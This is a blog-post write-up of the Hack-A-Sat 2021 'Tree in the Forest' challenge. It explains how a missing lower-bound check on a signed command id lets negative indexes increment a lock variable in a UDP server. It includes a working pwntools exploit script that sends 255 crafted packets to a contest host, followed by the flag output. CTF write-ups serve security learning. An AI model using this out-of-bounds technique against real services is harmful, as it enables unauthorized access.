<!doctype html><html lang=en-us><head><meta charset=utf-8><meta name=author content><meta name=description content><meta name=keywords content><meta name=viewport content="width=device-width,minimum-scale=1,initial-scale=1"><meta name=generator content="Hugo 0.99.1"><link rel=canonical href=https://starfleetcadet75.github.io/posts/hackasat-2021-tree-in-the-forest/><meta property="og:title" content="Hack-A-Sat 2021: Tree in the Forest"><meta property="og:description" content="Tree in the forest"><meta property="og:type" content="article"><meta property="og:url" content="https://starfleetcadet75.github.io/posts/hackasat-2021-tree-in-the-forest/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-06-30T00:00:00+00:00"><meta property="article:modified_time" content="2021-06-30T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="Hack-A-Sat 2021: Tree in the Forest"><meta name=twitter:description content="Tree in the forest"><meta itemprop=name content="Hack-A-Sat 2021: Tree in the Forest"><meta itemprop=description content="Tree in the forest"><meta itemprop=datePublished content="2021-06-30T00:00:00+00:00"><meta itemprop=dateModified content="2021-06-30T00:00:00+00:00"><meta itemprop=wordCount content="698"><meta itemprop=keywords content="exploitation,"><link rel=stylesheet href=/css/layout.css><link rel=stylesheet href=/css/default-dark.css><link rel=stylesheet href=/css/adoc-html5-extension.css><title>Hack-A-Sat 2021: Tree in the Forest</title></head><body><div class=main><header><div class=header-bar><nav><div class=siteTitle><a href=https://starfleetcadet75.github.io/>starfleetcadet75</a></div><a class=nav-item href=/about/><div class=nav-item-title>About</div></a><a class=nav-item href=/readinglist/><div class=nav-item-title>Reading List</div></a><a class="nav-item active" href=/posts/><div class=nav-item-title>Posts</div></a></nav><div class=social-links-header style=visibility:hidden;display:none><a href=mailto:starfleetcadet75@gmail.com><div class=social-link>email</div></a><a href=https://github.com/starfleetcadet75 target=_blank><div class=social-link>gh</div></a><a href=https://gitlab.com/starfleetcadet75 target=_blank><div class=social-link>gl</div></a></div></div></header><article class=post><h1 class=title>Hack-A-Sat 2021: Tree in the Forest</h1><div class=content><p><strong>Category:</strong> Exploitation<br><strong>Points:</strong> 31<br><strong>Provided:</strong> <a href="https://github.com/starfleetcadet75/writeups/blob/master/2021-Hack-A-Sat/tree-in-the-forest/parser.c?raw=true">parser.c</a></p><h2 id=challenge>Challenge</h2><blockquote><pre tabindex=0><code class=language-none data-lang=none>CC=g++-9.3.0

challenge: src/parser.c
    $(CC) src/parser.c -o $@
</code></pre><p>Connect to the challenge on:
<code>lucky-tree.satellitesabove.me:5008</code></p></blockquote><h2 id=observations>Observations</h2><p>We are provided with a C source file and the contents of a Makefile for compiling it.
The program is a simple UDP server that listens for messages on port 54321.
It continously receives messages in an infinite processing loop.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>do</span>{
</span></span><span style=display:flex><span>    std<span style=color:#f92672>::</span>stringstream response;
</span></span><span style=display:flex><span>    socklen_t len;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>int</span> n;
</span></span><span style=display:flex><span>    len <span style=color:#f92672>=</span> <span style=color:#66d9ef>sizeof</span>(cliaddr);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    n <span style=color:#f92672>=</span> recvfrom(sockfd, (<span style=color:#66d9ef>char</span> <span style=color:#f92672>*</span>)buffer, <span style=color:#66d9ef>sizeof</span>(command_header), MSG_WAITALL, (<span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>sockaddr</span> <span style=color:#f92672>*</span>)<span style=color:#f92672>&amp;</span>cliaddr, <span style=color:#f92672>&amp;</span>len);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (n <span style=color:#f92672>!=</span> <span style=color:#66d9ef>sizeof</span>(command_header)){ <span style=color:#75715e>// this should never happen, due to UDP
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      response <span style=color:#f92672>&lt;&lt;</span> <span style=color:#e6db74>&#34;Invalid length of command header, expected &#34;</span><span style=color:#f92672>&lt;&lt;</span><span style=color:#66d9ef>sizeof</span>(command_header)<span style=color:#f92672>&lt;&lt;</span><span style=color:#e6db74>&#34; but got &#34;</span><span style=color:#f92672>&lt;&lt;</span>n<span style=color:#f92672>&lt;&lt;</span>std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>      command_header<span style=color:#f92672>*</span> header <span style=color:#f92672>=</span> (command_header<span style=color:#f92672>*</span>)buffer;
</span></span><span style=display:flex><span>      response<span style=color:#f92672>&lt;&lt;</span><span style=color:#e6db74>&#34;Command header acknowledge: version:&#34;</span><span style=color:#f92672>&lt;&lt;</span>header<span style=color:#f92672>-&gt;</span>version<span style=color:#f92672>&lt;&lt;</span><span style=color:#e6db74>&#34; type:&#34;</span><span style=color:#f92672>&lt;&lt;</span>header<span style=color:#f92672>-&gt;</span>type<span style=color:#f92672>&lt;&lt;</span><span style=color:#e6db74>&#34; id:&#34;</span><span style=color:#f92672>&lt;&lt;</span>header<span style=color:#f92672>-&gt;</span>id<span style=color:#f92672>&lt;&lt;</span>std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>if</span> (header<span style=color:#f92672>-&gt;</span>id <span style=color:#f92672>&gt;=</span> COMMAND_LIST_LENGTH){
</span></span><span style=display:flex><span>        response<span style=color:#f92672>&lt;&lt;</span><span style=color:#e6db74>&#34;Invalid id:&#34;</span><span style=color:#f92672>&lt;&lt;</span>header<span style=color:#f92672>-&gt;</span>id<span style=color:#f92672>&lt;&lt;</span>std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>      } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// Log the message in the command log
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        command_log[header<span style=color:#f92672>-&gt;</span>id]<span style=color:#f92672>++</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// Handle the message, return the response
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        response<span style=color:#f92672>&lt;&lt;</span>handle_message(header)<span style=color:#f92672>&lt;&lt;</span>std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>      }
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    sendto(sockfd, response.str().c_str(), response.str().length(), MSG_CONFIRM, (<span style=color:#66d9ef>const</span> <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>sockaddr</span> <span style=color:#f92672>*</span>) <span style=color:#f92672>&amp;</span>cliaddr, len);
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>while</span>(<span style=color:#ae81ff>1</span>);
</span></span></code></pre></div><p>Each message must be 64 bytes long so that it can be processed as a <code>command_header</code> struct.
The <code>version</code> and <code>type</code> fields are displayed on stdout but otherwise never used.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>command_header</span> {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>short</span> version : <span style=color:#ae81ff>16</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>short</span> type : <span style=color:#ae81ff>16</span>;
</span></span><span style=display:flex><span>    command_id_type id : <span style=color:#ae81ff>32</span>;
</span></span><span style=display:flex><span>} command_header;
</span></span></code></pre></div><p><code>command_id_type</code> identifies the type of command based on an enumeration of 10 message types.
The last entry, <code>COMMAND_GETKEYS</code>, instructs the server to return the flag if the global variable <code>lock_state</code> is set to UNLOCKED.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>// Logs how many times each command has been hit.
</span></span></span><span style=display:flex><span><span style=color:#75715e>// Has a simple security feature that hides data from the user.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>typedef</span> <span style=color:#66d9ef>enum</span> <span style=color:#a6e22e>command_id_type</span> {
</span></span><span style=display:flex><span>    COMMAND_ADCS_ON <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>,
</span></span><span style=display:flex><span>    COMMAND_ADCS_OFF <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>,
</span></span><span style=display:flex><span>    COMMAND_CNDH_ON <span style=color:#f92672>=</span> <span style=color:#ae81ff>2</span>,
</span></span><span style=display:flex><span>    COMMAND_CNDH_OFF <span style=color:#f92672>=</span> <span style=color:#ae81ff>3</span>,
</span></span><span style=display:flex><span>    COMMAND_SPM <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>,
</span></span><span style=display:flex><span>    COMMAND_EPM <span style=color:#f92672>=</span> <span style=color:#ae81ff>5</span>,
</span></span><span style=display:flex><span>    COMMAND_RCM <span style=color:#f92672>=</span> <span style=color:#ae81ff>6</span>,
</span></span><span style=display:flex><span>    COMMAND_DCM <span style=color:#f92672>=</span> <span style=color:#ae81ff>7</span>,
</span></span><span style=display:flex><span>    COMMAND_TTEST <span style=color:#f92672>=</span> <span style=color:#ae81ff>8</span>,
</span></span><span style=display:flex><span>    COMMAND_GETKEYS <span style=color:#f92672>=</span> <span style=color:#ae81ff>9</span>, <span style=color:#75715e>// only allowed in unlocked state
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>} command_id_type;
</span></span></code></pre></div><p>The processing loop records each valid command that is received by incrementing the <code>command_log</code> array indexed by <code>id</code>.
Note that <code>lock_state</code> happens to be declared directly before the <code>command_log</code> array.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>// Globals used in this program, used to store command log and locked/unlocked state
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>unsigned</span> <span style=color:#66d9ef>int</span> lock_state;
</span></span><span style=display:flex><span><span style=color:#66d9ef>char</span> command_log[COMMAND_LIST_LENGTH];
</span></span></code></pre></div><h2 id=solution>Solution</h2><p>The vulnerability in this program is that the processing loop only validates that <code>id</code> is greater than or equal to 10.
This check permits negative <code>id</code> values to be used as an index into the <code>command_log</code> array.
Since the <code>lock_state</code> variable is located directly before the array on the stack, incrementing <code>command_log[-1]</code> causes <code>lock_state</code> to be incremented instead of a valid entry in the array.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#66d9ef>if</span> (header<span style=color:#f92672>-&gt;</span>id <span style=color:#f92672>&gt;=</span> COMMAND_LIST_LENGTH){
</span></span><span style=display:flex><span>    response<span style=color:#f92672>&lt;&lt;</span><span style=color:#e6db74>&#34;Invalid id:&#34;</span><span style=color:#f92672>&lt;&lt;</span>header<span style=color:#f92672>-&gt;</span>id<span style=color:#f92672>&lt;&lt;</span>std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>} <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Log the message in the command log
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    command_log[header<span style=color:#f92672>-&gt;</span>id]<span style=color:#f92672>++</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Handle the message, return the response
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    response<span style=color:#f92672>&lt;&lt;</span>handle_message(header)<span style=color:#f92672>&lt;&lt;</span>std<span style=color:#f92672>::</span>endl;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>We must set the value of <code>lock_state</code> to 0, however we can only increment the value.
Since the server runs in an infinite loop, we can just send 255 messages to cause <code>lock_state</code> to overflow back to a value of 0.
The actual <code>id</code> value we need to send is not -1 but -8 since the size of each array entry and <code>lock_state</code> are 64 bits.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>from</span> pwn <span style=color:#f92672>import</span> <span style=color:#f92672>*</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> socket
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>connect</span>():
</span></span><span style=display:flex><span>    s <span style=color:#f92672>=</span> socket<span style=color:#f92672>.</span>socket(socket<span style=color:#f92672>.</span>AF_INET, socket<span style=color:#f92672>.</span>SOCK_DGRAM)
</span></span><span style=display:flex><span>    <span style=color:#75715e>#s.connect((&#34;localhost&#34;, 54321))</span>
</span></span><span style=display:flex><span>    s<span style=color:#f92672>.</span>connect((<span style=color:#e6db74>&#34;18.118.161.198&#34;</span>, <span style=color:#ae81ff>10444</span>))
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> s
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>exploit</span>(p):
</span></span><span style=display:flex><span>    <span style=color:#75715e># Send the malicious message 255 times</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>255</span>):
</span></span><span style=display:flex><span>        msg <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>        msg <span style=color:#f92672>+=</span> p16(<span style=color:#ae81ff>1</span>)  <span style=color:#75715e># version = 1</span>
</span></span><span style=display:flex><span>        msg <span style=color:#f92672>+=</span> p16(<span style=color:#ae81ff>2</span>)  <span style=color:#75715e># type = 2</span>
</span></span><span style=display:flex><span>        msg <span style=color:#f92672>+=</span> p32(<span style=color:#ae81ff>0xfffffff8</span>)  <span style=color:#75715e># id = 0xfffffff8 = -8</span>
</span></span><span style=display:flex><span>        p<span style=color:#f92672>.</span>send(msg)
</span></span><span style=display:flex><span>        print(p<span style=color:#f92672>.</span>recvfrom(<span style=color:#ae81ff>1024</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    msg <span style=color:#f92672>=</span> <span style=color:#e6db74>b</span><span style=color:#e6db74>&#34;&#34;</span>
</span></span><span style=display:flex><span>    msg <span style=color:#f92672>+=</span> p16(<span style=color:#ae81ff>2</span>)  <span style=color:#75715e># version = 2</span>
</span></span><span style=display:flex><span>    msg <span style=color:#f92672>+=</span> p16(<span style=color:#ae81ff>4</span>)  <span style=color:#75715e># type = 4</span>
</span></span><span style=display:flex><span>    msg <span style=color:#f92672>+=</span> p32(<span style=color:#ae81ff>9</span>)  <span style=color:#75715e># id = COMMAND_GETKEYS</span>
</span></span><span style=display:flex><span>    p<span style=color:#f92672>.</span>send(msg)
</span></span><span style=display:flex><span>    print(p<span style=color:#f92672>.</span>recvfrom(<span style=color:#ae81ff>1024</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>p <span style=color:#f92672>=</span> connect()
</span></span><span style=display:flex><span>exploit(p)
</span></span></code></pre></div><p>The server outputs the flag after 255 iterations:</p><pre tabindex=0><code class=language-none data-lang=none>(b&#39;Command header acknowledge: version:1 type:2 id:-8\nCommand Success: LOCKED\n&#39;, (&#39;18.118.161.198&#39;, 10444))
(b&#39;Command header acknowledge: version:1 type:2 id:-8\nCommand Success: LOCKED\n&#39;, (&#39;18.118.161.198&#39;, 10444))
(b&#39;Command header acknowledge: version:1 type:2 id:-8\nCommand Success: LOCKED\n&#39;, (&#39;18.118.161.198&#39;, 10444))
(b&#39;Command header acknowledge: version:1 type:2 id:-8\nCommand Success: LOCKED\n&#39;, (&#39;18.118.161.198&#39;, 10444))
(b&#39;Command header acknowledge: version:1 type:2 id:-8\nCommand Success: LOCKED\n&#39;, (&#39;18.118.161.198&#39;, 10444))
(b&#39;Command header acknowledge: version:1 type:2 id:-8\nCommand Success: LOCKED\n&#39;, (&#39;18.118.161.198&#39;, 10444))
(b&#39;Command header acknowledge: version:1 type:2 id:-8\nCommand Success: LOCKED\n&#39;, (&#39;18.118.161.198&#39;, 10444))
(b&#39;Command header acknowledge: version:1 type:2 id:-8\nCommand Success: UNLOCKED\n&#39;, (&#39;18.118.161.198&#39;, 10444))
(b&#39;Command header acknowledge: version:2 type:4 id:9\nflag{hotel771085mike2:GDNSSINe9Y1jIMMauT0hcP4AAtJ0lAdSGD2WGrozvH79QG0xDaF9YFJhrmzv_YAw5ggfPT8YRBOQ0smqzWgDV3s}\n&#39;, (&#39;18.118.161.198&#39;, 10444))
</code></pre></div><footer class=post-footer><div class=post-footer-data><div class=tags><div class=tag><a href=/tags/exploitation>#exploitation</a></div></div><div class=post-footer-meta>Permalink: <a href=https://starfleetcadet75.github.io/posts/hackasat-2021-tree-in-the-forest/>/posts/hackasat-2021-tree-in-the-forest/</a> | Date: 2021-06-30</div><hr><div class=categories>Published in:<div class=category><a href=/categories/writeups>writeups</a></div></div><div class=series></div></div></footer></article><footer><div class=social-links-footer><a href=mailto:starfleetcadet75@gmail.com><div class=social-link>Email</div></a><a href=https://github.com/starfleetcadet75 target=_blank><div class=social-link>GitHub</div></a><a href=https://gitlab.com/starfleetcadet75 target=_blank><div class=social-link>GitLab</div></a><div class=social-link><a href=https://starfleetcadet75.github.io/index.xml target=_blank>RSS</a></div></div><div class=copyright></div><div class=poweredby>Powered by <a href=https://gohugo.io/>Hugo</a>.</div></footer></div></body></html>